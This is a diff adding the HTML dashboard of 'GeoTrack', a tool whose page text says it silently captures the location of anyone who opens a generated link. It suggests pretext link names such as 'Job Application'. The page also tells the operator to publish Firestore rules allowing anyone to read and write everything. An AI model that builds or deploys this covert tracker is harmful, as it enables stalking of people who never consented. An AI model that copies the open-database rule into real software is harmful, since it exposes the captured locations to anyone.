@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>GeoTrack — Location Tracker Dashboard</title>
+
+  <!-- Styles -->
+  <link rel="stylesheet" href="css/style.css" />
+
+  <!-- Font Awesome -->
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
+        crossorigin="anonymous" />
+
+  <!-- Leaflet CSS -->
+  <link rel="stylesheet"
+        href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+        crossorigin="" />
+</head>
+<body>
+
+<!-- ═══════════════════════════════════════════════════════════
+     NAVBAR
+════════════════════════════════════════════════════════════ -->
+<nav class="navbar">
+  <a href="index.html" class="navbar-brand">
+    <i class="fas fa-map-pin"></i>
+    <div>
+      <span>GeoTrack</span>
+      <div class="navbar-subtitle">Location Tracker</div>
+    </div>
+  </a>
+  <button class="btn btn-primary" onclick="openCreateModal()">
+    <i class="fas fa-plus"></i> New Tracking Link
+  </button>
+</nav>
+
+<!-- ═══════════════════════════════════════════════════════════
+     MAIN CONTENT
+════════════════════════════════════════════════════════════ -->
+<main class="container">
+
+  <!-- Hero -->
+  <div class="hero">
+    <h1><i class="fas fa-satellite-dish" style="font-size:0.85em;"></i> Location Tracker</h1>
+    <p>Generate unique tracking links. When someone opens your link, their location is silently captured and shown on your dashboard.</p>
+    <button class="btn btn-primary" onclick="openCreateModal()" style="font-size:1rem;padding:0.65rem 1.5rem;">
+      <i class="fas fa-plus"></i> Create Tracking Link
+    </button>
+  </div>
+
+  <!-- Firebase Config Warning -->
+  <div class="config-warning" id="configWarning" style="display:none;">
+    <i class="fas fa-exclamation-triangle"></i>
+    <div class="config-warning-text">
+      <h4>Firebase Not Configured</h4>
+      <p>
+        Open <code>js/config.js</code> and replace the placeholder values with your Firebase credentials.
+        See <a href="README.md" target="_blank">README.md</a> for step-by-step setup instructions.
+      </p>
+    </div>
+  </div>
+
+  <!-- Firestore Permissions Error -->
+  <div class="config-warning" id="permissionsError" style="display:none;">
+    <i class="fas fa-lock"></i>
+    <div class="config-warning-text">
+      <h4>Firestore Permission Denied</h4>
+      <p>
+        Your Firestore security rules are blocking access. Fix this in 30 seconds:
+        <br>
+        1. Go to <a href="https://console.firebase.google.com" target="_blank">Firebase Console</a>
+        → <strong>Firestore Database</strong> → <strong>Rules</strong> tab
+        <br>
+        2. Replace the rules with:
+        <br>
+        <code style="display:inline-block;margin-top:6px;padding:6px 10px;background:rgba(0,0,0,0.3);border-radius:4px;font-size:0.78rem;">
+          rules_version = '2';<br>
+          service cloud.firestore {<br>
+          &nbsp;&nbsp;match /databases/{database}/documents {<br>
+          &nbsp;&nbsp;&nbsp;&nbsp;match /{document=**} {<br>
+          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;allow read, write: if true;<br>
+          &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+          &nbsp;&nbsp;}<br>
+          }
+        </code>
+        <br>
+        3. Click <strong>Publish</strong> → refresh this page.
+      </p>
+    </div>
+  </div>
+
+  <!-- Stats -->
+  <div class="stats-grid">
+    <div class="stat-card">
+      <div class="stat-icon blue"><i class="fas fa-link"></i></div>
+      <div class="stat-info">
+        <h3 id="statTotalLinks">…</h3>
+        <p>Tracking Links</p>
+      </div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-icon green"><i class="fas fa-map-marker-alt"></i></div>
+      <div class="stat-info">
+        <h3 id="statTotalHits">…</h3>
+        <p>Total Hits</p>
+      </div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-icon orange"><i class="fas fa-globe"></i></div>
+      <div class="stat-info">
+        <h3>GPS</h3>
+        <p>Location Method</p>
+      </div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-icon purple"><i class="fas fa-shield-alt"></i></div>
+      <div class="stat-info">
+        <h3>Live</h3>
+        <p>Real-time Updates</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Links Section -->
+  <div class="section-header">
+    <h2><i class="fas fa-list"></i> Your Tracking Links</h2>
+    <button class="btn btn-secondary btn-sm" onclick="openCreateModal()">
+      <i class="fas fa-plus"></i> New Link
+    </button>
+  </div>
+
+  <div class="links-container">
+    <table class="links-table">
+      <thead>
+        <tr>
+          <th>Name</th>
+          <th>Tracking URL</th>
+          <th>Hits</th>
+          <th>Created</th>
+          <th>Actions</th>
+        </tr>
+      </thead>
+      <tbody id="linksTableBody"></tbody>
+    </table>
+
+    <!-- Empty state: no links yet (after Firebase configured) -->
+    <div id="emptyState" class="empty-state" style="display:none;">
+      <i class="fas fa-map-marked-alt"></i>
+      <h3>No tracking links yet</h3>
+      <p>Create your first tracking link and share it to start collecting locations.</p>
+      <button class="btn btn-primary" onclick="openCreateModal()">
+        <i class="fas fa-plus"></i> Create First Link
+      </button>
+    </div>
+
+    <!-- Empty state: Firebase not configured -->
+    <div id="configEmptyState" class="empty-state" style="display:none;">
+      <i class="fas fa-cog"></i>
+      <h3>Setup Required</h3>
+      <p>Configure Firebase in <code>js/config.js</code> to get started.</p>
+      <a href="README.md" target="_blank" class="btn btn-secondary">
+        <i class="fas fa-book"></i> View Setup Guide
+      </a>
+    </div>
+  </div>
+
+</main>
+
+<!-- ═══════════════════════════════════════════════════════════
+     CREATE LINK MODAL
+════════════════════════════════════════════════════════════ -->
+<div class="modal-overlay" id="createModal">
+  <div class="modal" style="max-width:460px;">
+    <div class="modal-header">
+      <h3><i class="fas fa-plus-circle"></i> Create Tracking Link</h3>
+      <button class="modal-close" onclick="closeCreateModal()">
+        <i class="fas fa-times"></i>
+      </button>
+    </div>
+    <div class="modal-content-pad">
+      <div class="form-group">
+        <label for="linkName">Link Name <span style="color:var(--accent-red)">*</span></label>
+        <input
+          type="text"
+          id="linkName"
+          class="form-control"
+          placeholder="e.g. Friend Survey, Job Application…"
+          maxlength="60"
+          autocomplete="off"
+        />
+      </div>
+      <p style="font-size:0.8rem;color:var(--text-muted);margin-top:-0.5rem;">
+        <i class="fas fa-info-circle"></i>
+        A unique tracking URL will be generated. Share it with anyone — when they open it, their location is captured.
+      </p>
+    </div>
+    <div class="modal-footer">
+      <button class="btn btn-secondary" onclick="closeCreateModal()">Cancel</button>
+      <button class="btn btn-primary" id="createLinkBtn" onclick="createLink()">
+        <i class="fas fa-plus"></i> Create Link
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════
+     VIEW LOCATIONS MODAL
+════════════════════════════════════════════════════════════ -->
+<div class="modal-overlay" id="viewModal">
+  <div class="modal">
+    <div class="modal-header">
+      <h3><i class="fas fa-map-marked-alt"></i> <span id="viewModalTitle">Locations</span></h3>
+      <button class="modal-close" onclick="closeViewModal()">
+        <i class="fas fa-times"></i>
+      </button>
+    </div>
+    <div class="modal-body">
+      <!-- Leaflet Map -->
+      <div id="map"></div>
+      <!-- Location list -->
+      <div class="location-list" id="locationList">
+        <div class="no-locations">
+          <i class="fas fa-map-marker-alt"></i>
+          No locations yet.
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════
+     TOAST CONTAINER
+════════════════════════════════════════════════════════════ -->
+<div class="toast-container" id="toastContainer"></div>
+
+<!-- ═══════════════════════════════════════════════════════════
+     SCRIPTS
+════════════════════════════════════════════════════════════ -->
+
+<!-- Firebase SDK (compat) -->
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+
+<!-- Leaflet JS -->
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" crossorigin=""></script>
+
+<!-- App scripts -->
+<script src="js/config.js"></script>
+<script src="js/dashboard.js"></script>
+
+</body>
+</html>
